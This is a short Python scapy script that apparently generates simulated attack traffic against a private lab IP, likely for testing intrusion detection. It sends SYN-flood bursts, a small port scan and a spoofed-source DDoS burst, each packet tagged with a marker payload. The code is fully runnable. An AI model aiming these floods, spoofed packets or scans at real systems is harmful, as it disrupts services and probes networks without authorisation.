import scapy.all as scapy
import random
import time
from datetime import datetime


target_ip =  "10.29.155.156"
attacker_ip = "192.168.143.99"

print(f"\n🚨 ATTACK SCRIPT LAUNCHED AS: {attacker_ip} -> TARGET: {target_ip}\n")

def dos_attack():
    print(f"\n [DoS] Sending attack at {datetime.now().strftime('%H:%M:%S')}")
    for _ in range(100):
        packet = scapy.IP(dst=target_ip, src=attacker_ip) / \
                 scapy.TCP(sport=random.randint(1024, 65535), dport=80, flags="S") / \
                 scapy.Raw(load="###DOS_ATTACK###")
        scapy.send(packet, verbose=False)
    print("📦 Sent 100 crafted DoS packets with payload '###DOS_ATTACK###'")

def port_scan():
    print(f"\n[Port Scan] Starting scan at {datetime.now().strftime('%H:%M:%S')}")
    for port in range(20, 30):  # You can increase this range
        print(f"➡ Scanning Port {port}...")
        packet = scapy.IP(dst=target_ip, src=attacker_ip) / \
                 scapy.TCP(sport=random.randint(1024, 65535), dport=port, flags="S") / \
                 scapy.Raw(load="###PORT_SCAN###")
        scapy.send(packet, verbose=False)
        time.sleep(0.2)
    print("Port scan completed with detectable payload '###PORT_SCAN###'")
    
def ddos_attack():
    print(f"\n🌩️ [DDoS] Launching distributed packets at {datetime.now().strftime('%H:%M:%S')}")
    for _ in range(200):  # Adjust count as needed for realism
        spoofed_ip = f"192.168.143.{random.randint(100, 254)}"  # Randomized spoofed IPs
        packet = scapy.IP(dst=target_ip, src=spoofed_ip) / \
                 scapy.TCP(sport=random.randint(1024, 65535), dport=80, flags="S") / \
                 scapy.Raw(load="###DDOS_ATTACK###")
        scapy.send(packet, verbose=False)
    print("📦 Sent 200 spoofed packets from random IPs with payload '###DDOS_ATTACK###'")


try:
    while True:
        attack = random.choice([dos_attack, port_scan])
        attack()
        time.sleep(5)
except KeyboardInterrupt:
    print("\n🛑 Attack simulation stopped by user.")
